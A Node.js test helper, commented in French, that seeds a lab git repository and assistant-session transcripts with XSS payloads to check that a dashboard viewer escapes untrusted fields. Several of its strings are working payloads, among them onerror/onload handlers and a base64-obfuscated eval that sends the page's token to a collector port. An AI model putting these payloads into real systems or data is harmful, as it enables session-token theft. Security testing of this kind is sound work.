#!/usr/bin/env node
// frise-bornes-labo.mjs <lab> <home> <port-collecteur> [simple] : aide de test-cockpit-frise-bornes.sh et de test-cockpit-frise-xss.sh (74-09).
// Sur un lab déjà créé par `frise-labo.mjs lab`, pose un dépôt et des transcripts PIÉGÉS : nom d'agent (rôle), branche, message de commit,
// auteur, texte de message, mandat, cible (forme `<chemin> (worktree <nom>)`) portent `<img src=x onerror=…>`, et un `Bash` porte la dernière
// commande (CMD-SECRET-74). La charge des champs sans « / » (rôle, branche, cible) n'écrit que le marqueur window.__xss74 ; celle du message
// de commit et du texte de message envoie en plus le jeton de la page à l'origine tierce <port-collecteur>. Avec `simple` : mêmes transcripts, texte inoffensif.
// Le NOM d'un agent est piégé aussi : `description` du sous-agent (meta) et titre de la session (ligne `custom-title`), les deux noms que la frise, l'encart, le coût et la fiche affichent.
// Identifiants : session sess-x1, sous-agent wk01. Aucune donnée du poste ; n'importe jamais le code testé.
import fs from 'node:fs';
import path from 'node:path';
import { execFileSync } from 'node:child_process';

const [, , LAB, HOME, PORT, mode] = process.argv;
const SIMPLE = mode === 'simple';
const ISO = (ms) => new Date(ms).toISOString();
const GIT_ENV = { ...process.env, GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: '/dev/null' };
for (const k of ['GIT_DIR', 'GIT_WORK_TREE', 'GIT_INDEX_FILE', 'GIT_COMMON_DIR']) delete GIT_ENV[k];
const git = (...a) => execFileSync('git', ['-C', LAB, '-c', 'user.email=t@t', '-c', 'user.name=t', ...a], { stdio: 'ignore', env: GIT_ENV });


// modes `dup` et `dupdistinct` (B1, M-DOUBLE-COMPTE) : une session de trois lignes assistant à usage 100/50 ; `dup` répète le message.id (le transcript écrit
// un message en plusieurs lignes : l'usage ne se compte qu'une fois), `dupdistinct` donne trois identifiants (l'usage se compte trois fois : la fixture qui doit rougir)
if (mode === 'dup' || mode === 'dupdistinct') {
  const dir = path.join(HOME, '.claude', 'projects', '-lab'); fs.mkdirSync(dir, { recursive: true });
  const L = [{ type: 'user', timestamp: ISO(Date.now() - 80000e3), cwd: LAB, sessionId: 'sess-d1', version: '2.1.322', origin: { kind: 'human' }, message: { role: 'user', content: 'MARQ-TEXTE' } }];
  for (let i = 0; i < 3; i++) L.push({ type: 'assistant', timestamp: ISO(Date.now() - (900 - i * 10) * 1000), cwd: LAB, sessionId: 'sess-d1', version: '2.1.322',
    message: { id: mode === 'dup' ? 'msg_dup' : `msg_dup_${i}`, model: 'claude-test-1', role: 'assistant', stop_reason: 'end_turn',
      usage: { input_tokens: 100, output_tokens: 50, cache_read_input_tokens: 0, cache_creation_input_tokens: 0 }, content: [{ type: 'text', text: 'MARQ-TEXTE' }] } });
  fs.writeFileSync(path.join(dir, 'sess-d1.jsonl'), L.map((o) => JSON.stringify(o)).join('\n') + '\n');
  process.exit(0);
}

// charge à atob sans « / » ni « + » dans le base64 (un nom de branche n'en veut pas) : on décale l'alignement par des espaces de tête
const JS = `fetch('http://127.0.0.1:${PORT}/?t='+VF_COCKPIT_SERVER.token);window.__xss74=1`;
let b64 = '';
for (let i = 0; i < 400; i++) { b64 = Buffer.from(' '.repeat(i) + JS).toString('base64'); if (!/[/+]/.test(b64)) break; }
export const ATOB = `eval(atob('${b64}'))`;
const MARQ = 'window.__xss74=1';
export const CHARGES = {
  role: SIMPLE ? 'vf-coder' : `<img src=x onerror=${MARQ}>`,
  cible: SIMPLE ? 'a.js (worktree wt)' : `a.js (worktree <img src=x onerror=${MARQ}>)`,
  branche: SIMPLE ? 'feat-x' : `<svg/onload=${ATOB}>`,
  message: SIMPLE ? 'message de commit' : `<img src=x onerror=${ATOB}>`,
  texte: SIMPLE ? 'texte' : `<img src=x onerror=${ATOB}> et [x](javascript:${MARQ})`,
  mandat: SIMPLE ? 'mandat' : `<img src=x onerror=${MARQ}>`,
  desc: SIMPLE ? 'MARQ-DESC' : `MARQ-DESC <img src=x onerror=${MARQ}>`,
  titre: SIMPLE ? 'titre' : `<img src=x onerror=${MARQ}>`,
};

// dépôt : branche piégée, commit au message et à l'auteur piégés
git('branch', CHARGES.branche);
fs.writeFileSync(path.join(LAB, 'src', 'v.js'), 'export const v = 1;\n');
git('add', '-A');
execFileSync('git', ['-C', LAB, '-c', 'user.email=t@t', '-c', 'user.name=t', 'commit', '-q', '-m', CHARGES.message, '-m', 'corps : ' + CHARGES.message],
  { stdio: 'ignore', env: { ...GIT_ENV, GIT_AUTHOR_NAME: SIMPLE ? 'auteur' : `x"/onfocus=${ATOB}/autofocus/a="` } });

// transcripts
const now = Date.now();
let SEQ = 0;
const base = (sid, extra = {}) => ({ cwd: LAB, sessionId: sid, version: '2.1.322', ...extra });
const assistant = (sid, ageS, texte, outils, extra = {}) => {
  const blocs = [{ type: 'text', text: texte }], ids = [];
  for (const o of outils) { const id = `toolu_${sid}_${++SEQ}`; ids.push(id); blocs.push({ type: 'tool_use', id, name: o.name, input: o.input }); }
  const t = now - ageS * 1000;
  const a = { type: 'assistant', timestamp: ISO(t), ...base(sid, extra), message: { id: `msg_${sid}_${++SEQ}`, model: 'claude-test-1', role: 'assistant',
    stop_reason: 'tool_use', usage: { input_tokens: 10, output_tokens: 5, cache_read_input_tokens: 0, cache_creation_input_tokens: 0 }, content: blocs } };
  const r = ids.map((id) => ({ type: 'user', timestamp: ISO(t + 500), ...base(sid, extra), message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: id, content: 'MARQ-SORTIE' }] } }));
  return [a, ...r];
};
const humain = (sid, ageS, texte, extra = {}) => ({ type: 'user', timestamp: ISO(now - ageS * 1000), ...base(sid, extra), origin: { kind: 'human' }, message: { role: 'user', content: texte } });
const outilsDe = [{ name: 'Write', input: { file_path: `${LAB}/src/${CHARGES.cible}`, content: 'x' } }, { name: 'Bash', input: { command: 'echo CMD-SECRET-74' } },
  { name: 'Write', input: { file_path: `${LAB}/src/a.js`, content: 'y' } }];
const proj = path.join(HOME, '.claude', 'projects', '-lab');
const sub = path.join(proj, 'sess-x1', 'subagents');
fs.mkdirSync(sub, { recursive: true });
const ecrire = (f, lignes) => fs.writeFileSync(f, lignes.map((o) => JSON.stringify(o)).join('\n') + '\n');
ecrire(path.join(proj, 'sess-x1.jsonl'), [humain('sess-x1', 80000, 'MARQ-TEXTE'), ...assistant('sess-x1', 1800, CHARGES.texte, outilsDe), ...assistant('sess-x1', 600, 'fin', []),
  { type: 'custom-title', customTitle: CHARGES.titre, sessionId: 'sess-x1' }]);
const sa = { isSidechain: true, agentId: 'wk01' };
ecrire(path.join(sub, 'agent-wk01.jsonl'), [humain('sess-x1', 1500, CHARGES.mandat, sa), ...assistant('sess-x1', 1400, CHARGES.texte, outilsDe, sa), ...assistant('sess-x1', 700, 'fin', [], sa)]);
fs.writeFileSync(path.join(sub, 'agent-wk01.meta.json'), JSON.stringify({ agentType: CHARGES.role, description: CHARGES.desc, spawnDepth: 1, toolUseId: 'toolu_wk01', requestShape: 'foreground', finished: true }));
console.log(JSON.stringify({ charges: CHARGES, atob: ATOB }));
